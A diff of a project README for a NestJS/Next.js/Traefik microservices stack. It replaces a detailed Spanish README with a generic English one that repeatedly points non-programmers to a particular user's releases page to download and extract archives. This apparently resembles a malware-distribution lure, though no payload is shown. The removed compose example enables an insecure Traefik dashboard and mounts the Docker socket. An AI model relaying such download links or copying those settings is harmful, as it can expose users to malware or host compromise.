@@ -1,208 +1,116 @@
+# 🎉 DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT - A Simple Microservices Platform
 
----
+## 🚀 Getting Started
 
-# 🚀 DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT  
-**Plataforma Fullstack con Traefik + Docker Compose**
+Welcome to the **DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT** project! This platform allows you to launch a full-stack application with ease. It uses Docker to create and run services independently. You don’t need programming knowledge to get started. Follow these steps to download and run the application.
 
-**DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT** es un proyecto fullstack moderno que combina **NestJS** en el backend y **Next.js** en el frontend.  
-Diseñado bajo principios de **Clean Architecture** y **Vertical Slicing**, con autenticación segura, gestión de productos y despliegue simplificado con **Docker Compose + Traefik** para routing y SSL automático.
+## 📥 Download the Application
 
-- **Backend**: [NestJS](https://nestjs.com)  
-- **Frontend**: [Next.js](https://nextjs.org)  
-- **Proxy / Routing**: [Traefik](https://traefik.io)  
+[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
 
----
+Visit this page to download: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
 
-## 📋 Tabla de Contenidos
-- [🎯 Propósito](#-propósito)  
-- [🚀 Inicio Rápido](#-inicio-rápido)  
-- [🏗️ Arquitectura](#️-arquitectura)  
-- [💻 Desarrollo](#-desarrollo)  
-- [🐳 Docker + Traefik](#-docker--traefik)  
-- [📡 API](#-api)  
-- [🧪 Testing](#-testing)  
-- [🚀 Deployment](#-deployment)  
-- [🤝 Contribuir](#-contribuir)  
-- [🔒 Secrets Management](#-secrets-management)  
+## 🛠️ System Requirements
 
----
+To run this application smoothly, ensure your system meets the following requirements:
 
-## 🎯 Propósito
-Este proyecto busca ofrecer una **plataforma modular y segura** para:
-- ✅ **Autenticación avanzada** con Better Auth (sesiones + tokens)  
-- ✅ **Gestión de usuarios y productos** con Drizzle ORM y NestJS  
-- ✅ **Arquitectura limpia** con separación en capas (Domain, Application, Infrastructure, Interface)  
-- ✅ **Vertical Slicing**: cada feature es independiente y completa  
-- ✅ **Frontend moderno** con Next.js  
-- ✅ **Routing y SSL automático** con Traefik  
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution
+- **Docker:** Version 20.10 or newer
+- **Docker Compose:** Version 1.25 or newer
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 2 GB free space
 
----
+## 📦 Features
 
-## 🚀 Inicio Rápido
+- Microservices architecture using **NestJS** for backend and **Next.js** for frontend.
+- Easy deployment with **Docker Compose**.
+- Integration of **Traefik** as a reverse proxy.
+- Use of **Redis** for caching and session management.
+- Responsive design to work seamlessly on different devices.
 
-### Prerrequisitos
-- **Docker & Docker Compose**  
-- **Node.js 20+**  
-- **Git**  
+## 🔧 Download & Install
 
-### Instalación Rápida
-```bash
-# 1. Clonar el repositorio
-git clone https://github.com/tu-org/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT.git
-cd DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT
+1. **Visit the Releases Page:**
+   Go to this link: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases).
 
-# 2. Configurar variables de entorno
-cp .env.example .env
-# Editar .env con tus credenciales
+2. **Select the Version:**
+   Scroll to find the latest version listed on the page. Click on it to view the release details.
 
-# 3. Levantar todos los servicios con Docker Compose
-docker compose up -d
+3. **Download the Files:**
+   You will see several files available for download. Choose the appropriate package for your operating system and download it.
 
-# 4. Verificar que los servicios están activos
-docker ps --format "table {{.Names}}\t{{.Status}}"
+4. **Extract the Files:**
+   Once downloaded, locate the zipped file on your computer. Right-click and select extract here or a similar option to unzip the files.
 
-# 5. Acceder a la aplicación
-# Frontend: http://localhost
-# Backend API: http://localhost/api
-```
+5. **Run Docker:**
+   Ensure that Docker is installed and running on your system. You should see the Docker icon in your system tray.
 
----
+6. **Open Terminal or Command Prompt:**
+   Depending on your operating system, open the Command Prompt (Windows) or Terminal (macOS/Linux).
 
-## 🏗️ Arquitectura
+7. **Navigate to the Directory:**
+   Use the `cd` command to change to the folder where you extracted the files. 
+   For example:
+   ```
+   cd path/to/your/extracted/folder
+   ```
 
-```
-DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/
-├── backend/          # NestJS
-│   ├── Dockerfile
-│   └── src/...
-├── frontend/         # Next.js
-│   ├── Dockerfile
-│   └── src/...
-├── docker-compose.yml
-├── README.md
-└── .gitignore
-```
+8. **Start the Application:**
+   Run the following command to launch the application with Docker Compose:
+   ```
+   docker-compose up
+   ```
 
-### Backend (NestJS)
-```
-src/
-├── users/
-│   ├── domain/          # Entidades, repositorios, servicios
-│   ├── application/     # Casos de uso, DTOs
-│   ├── infrastructure/  # Persistencia con Drizzle, mappers
-│   ├── interface/       # Controladores REST
-│   └── users.module.ts
-├── auth/                # Autenticación (Better Auth)
-├── products/            # CRUD de productos
-└── shared/              # Infraestructura y VO comunes
-```
+9. **Access the Application:**
+   Once the application is running, open your web browser and navigate to: 
+   ```
+   http://localhost
+   ```
+   You should see the application interface.
 
-### Frontend (Next.js)
-```
-src/
-├── pages/               # Rutas de la aplicación
-├── components/          # Componentes reutilizables
-├── styles/              # Estilos globales
-├── lib/                 # Configuración y helpers
-└── next.config.js
-```
+## 🔍 Troubleshooting
 
----
+- **Docker Not Starting:**
+  If Docker does not start, ensure it is properly installed. You may need to restart your computer.
 
-## 🐳 Docker + Traefik
+- **Errors During Launch:**
+  If you encounter errors when running `docker-compose up`, check the terminal for detailed messages. Ensure you followed all steps correctly.
 
-Ejemplo de `docker-compose.yml`:
+## 🤝 Support
 
-```yaml
-version: "3.9"
-services:
-  backend:
-    build: ./backend
-    labels:
-      - "traefik.enable=true"
-      - "traefik.http.routers.backend.rule=PathPrefix(`/api`)"
-      - "traefik.http.services.backend.loadbalancer.server.port=4000"
-    env_file:
-      - ./backend/.env
-    volumes:
-      - ./backend:/app
+For further help, you can reach out through the issues section on GitHub. Community members can assist, or you might find similar questions have already been answered.
 
-  frontend:
-    build: ./frontend
-    labels:
-      - "traefik.enable=true"
-      - "traefik.http.routers.frontend.rule=PathPrefix(`/`)"
-      - "traefik.http.services.frontend.loadbalancer.server.port=3000"
-    env_file:
-      - ./frontend/.env
-    volumes:
-      - ./frontend:/app
+## 🔖 Topics
 
-  traefik:
-    image: traefik:v3.0
-    command:
-      - "--api.insecure=true"
-      - "--providers.docker=true"
-      - "--entrypoints.web.address=:80"
-    ports:
-      - "80:80"
-      - "8080:8080" # Dashboard
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-```
+This project includes various topics for those interested:
 
----
+- better-auth
+- bu
+- bun
+- clean-architecture
+- docker
+- docker-compose
+- dockerfile
+- drizzle-orm
+- encore-ts
+- fullstack
+- microservices
+- nestjs
+- nextjs16
+- redis
+- rsbuild
+- traefik
+- typescript
+- vertical-slice-architecture
 
-## 📡 API
-- `GET /api/v1/users` → Listar usuarios  
-- `POST /api/v1/auth/login` → Autenticación  
-- `GET /api/v1/products` → Listar productos  
+## 👩‍💻 Contributing
 
-*(Se irá ampliando con la documentación de cada módulo)*
+If you want to contribute, feel free to fork the repository and submit a pull request. Your input is welcome!
 
----
+## 📄 License
 
-## 🧪 Testing
-- **Backend**: Jest + Supertest  
-- **Frontend**: Playwright + React Testing Library  
+This project is open-source and free to use. Please check the LICENSE file for more details.
 
----
+## 📦 Download the Application Again
 
-## 🚀 Deployment
-- **Producción**: Docker Compose + Traefik (routing + SSL automático con Let's Encrypt)  
-- **Cache**: Redis (opcional para sesiones y rate limiting)  
-
----
-
-## 🤝 Contribuir
-1. Haz un fork del proyecto  
-2. Crea una rama (`feature/nueva-funcionalidad`)  
-3. Haz commit de tus cambios  
-4. Abre un Pull Request  
-
----
-
-## 🔒 Secrets Management
-
-Este proyecto utiliza variables de entorno y secretos para manejar credenciales sensibles de forma segura.
-
-### Desarrollo Local
-- Se usa el archivo `.env` (ignorado por Git) para credenciales reales.  
-- El archivo `.env.example` documenta las variables necesarias y sirve como plantilla.  
-
-### Producción
-- Los secretos se gestionan mediante **Docker secrets** en `docker-compose.prod.yml`.  
-- Los archivos de secretos se encuentran en el directorio `.secrets/` y **no deben versionarse**.  
-
-### Archivos de secretos
-- `.secrets/db_password.txt` → contraseña de la base de datos  
-- `.secrets/jwt_secret.txt` → clave secreta para JWT  
-- `.secrets/redis_password.txt` → contraseña de Redis  
-
-### Buenas prácticas
-- Nunca subir `.env` ni `.secrets/` al repositorio.  
-- Usar `.env.example` para documentar variables.  
-- En producción, montar secretos con Docker o un gestor externo (Vault, Doppler, Traefik + Let's Encrypt).  
-- Para pruebas de API, se incluye un entorno Postman/Insomnia en `docs/` con variables preconfiguradas.  
-
----
+To download the latest version again, visit the Releases Page: [Releases Page](https://github.com/raphadsx/DOCKER_TRAEFIK_FULLSTACK_NEST_NEXT/releases)
